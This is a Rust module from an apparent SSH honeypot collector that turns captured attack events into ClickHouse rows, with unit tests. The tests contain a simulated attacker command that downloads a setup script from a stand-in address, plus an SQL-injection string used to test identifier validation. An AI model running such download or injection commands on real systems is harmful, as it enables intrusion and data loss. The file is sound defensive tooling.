//! Pure helpers for turning JSONL honeypot events into ClickHouse rows.
//!
//! The tail loop in `main` calls these functions. They stay free of I/O so
//! the mapping can be tested without a database.

use std::net::{IpAddr, SocketAddr};

use anyhow::{Context, Result};
use chrono::{DateTime, Utc};
use honeytrap_shared::events::HoneypotEvent;
use serde_json::json;

/// Parse one JSONL line into an event.
pub fn parse_event_line(line: &str) -> Result<HoneypotEvent, serde_json::Error> {
    serde_json::from_str(line)
}

/// Build one JSONEachRow object for `honeytrap.events_raw`.
pub fn event_to_clickhouse_row(event: &HoneypotEvent, raw_json: &str) -> Result<String> {
    let (country_code, country_name, city, asn, asn_org) = (
        event.source.country_code.clone().unwrap_or_default(),
        event.source.country_name.clone().unwrap_or_default(),
        event.source.city.clone().unwrap_or_default(),
        event.source.asn.unwrap_or(0),
        event.source.asn_org.clone().unwrap_or_default(),
    );

    let (username, auth_method, auth_success) = match &event.credentials {
        Some(creds) => (
            creds.username.clone(),
            creds.auth_method.clone(),
            u8::from(creds.success),
        ),
        None => (String::new(), String::new(), 0),
    };

    let (command, command_name) = match &event.command {
        Some(cmd) => (
            cmd.command.clone(),
            cmd.command_name.clone().unwrap_or_default(),
        ),
        None => (String::new(), String::new()),
    };

    let row = json!({
        "ts": format_ts(event.timestamp),
        "id": event.id.to_string(),
        "session_id": event.session_id.to_string(),
        "honeypot_id": event.destination.honeypot_id,
        "protocol": event.protocol.to_string(),
        "category": format!("{:?}", event.category).to_lowercase(),
        "severity": format!("{:?}", event.severity).to_lowercase(),
        "source_ip": to_ipv6_string(&event.source.ip),
        "source_port": event.source.port,
        "dest_ip": to_ipv6_string(&event.destination.ip),
        "dest_port": event.destination.port,
        "tags": event.tags,
        "country_code": country_code,
        "country_name": country_name,
        "city": city,
        "asn": asn,
        "asn_org": asn_org,
        "username": username,
        "auth_method": auth_method,
        "auth_success": auth_success,
        "command": command,
        "command_name": command_name,
        "raw_data": event.raw_data.clone().unwrap_or_default(),
        "event_json": raw_json
    });

    Ok(serde_json::to_string(&row)?)
}

pub fn format_ts(ts: DateTime<Utc>) -> String {
    ts.format("%Y-%m-%d %H:%M:%S%.3f").to_string()
}

pub fn to_ipv6_string(ip_str: &str) -> String {
    match ip_str.parse::<IpAddr>() {
        Ok(IpAddr::V4(v4)) => v4.to_ipv6_mapped().to_string(),
        Ok(IpAddr::V6(v6)) => v6.to_string(),
        Err(_) => {
            metrics::counter!("collector_bad_ip_total").increment(1);
            "::".to_string()
        }
    }
}

/// ClickHouse identifiers are interpolated into the INSERT statement.
pub fn is_safe_ident(value: &str) -> bool {
    !value.is_empty()
        && value
            .chars()
            .all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
}

pub fn metrics_addr(raw: &str) -> Result<SocketAddr> {
    raw.parse::<SocketAddr>()
        .with_context(|| format!("invalid metrics address {raw}"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use honeytrap_shared::{
        CommandExecution, Credentials, DestinationInfo, EventCategory, Protocol, Severity,
        SourceInfo,
    };
    use uuid::Uuid;

    fn event_with_command(command: &str) -> HoneypotEvent {
        HoneypotEvent::new(
            Uuid::nil(),
            Protocol::Ssh,
            EventCategory::Command,
            SourceInfo::new("203.0.113.10".to_string(), 40000),
            DestinationInfo {
                ip: "10.0.0.5".to_string(),
                port: 2222,
                honeypot_id: "ssh-01".to_string(),
            },
        )
        .with_severity(Severity::High)
        .with_credentials(Credentials {
            username: "root".to_string(),
            password: Some("secret".to_string()),
            ssh_key: None,
            auth_method: "password".to_string(),
            success: true,
        })
        .with_command(CommandExecution {
            command: command.to_string(),
            command_name: Some("wget".to_string()),
            arguments: None,
            output: None,
            working_directory: Some("/root".to_string()),
        })
    }

    #[test]
    fn row_maps_documentation_address_and_stays_one_line() {
        let event = event_with_command("wget http://198.51.100.23/setup.sh");
        let raw = serde_json::to_string(&event).unwrap();
        let row = event_to_clickhouse_row(&event, &raw).unwrap();
        assert!(!row.contains('\n'));
        let parsed: serde_json::Value = serde_json::from_str(&row).unwrap();
        assert_eq!(parsed["source_ip"], "::ffff:203.0.113.10");
        assert_eq!(parsed["protocol"], "ssh");
        assert_eq!(parsed["category"], "command");
        assert_eq!(parsed["auth_success"], 1);
        assert_eq!(parsed["command"], "wget http://198.51.100.23/setup.sh");
        assert!(parsed["event_json"].as_str().unwrap().contains("secret"));
    }

    #[test]
    fn bad_json_is_rejected() {
        assert!(parse_event_line("{not json").is_err());
    }

    #[test]
    fn sample_file_round_trips_through_the_processor() {
        let raw = include_str!("../../data/events/ssh.jsonl");
        let mut count = 0;
        for line in raw.lines().filter(|line| !line.trim().is_empty()) {
            let event = parse_event_line(line).unwrap();
            let row = event_to_clickhouse_row(&event, line).unwrap();
            assert!(!row.contains('\n'));
            count += 1;
        }
        assert!(count >= 4, "sample file should contain a small session");
    }

    #[test]
    fn identifiers_reject_sql_metacharacters() {
        assert!(is_safe_ident("events_raw"));
        assert!(!is_safe_ident("events; DROP TABLE"));
        assert!(!is_safe_ident(""));
    }

    #[test]
    fn unparseable_ip_becomes_unspecified() {
        assert_eq!(to_ipv6_string("not-an-ip"), "::");
    }
}
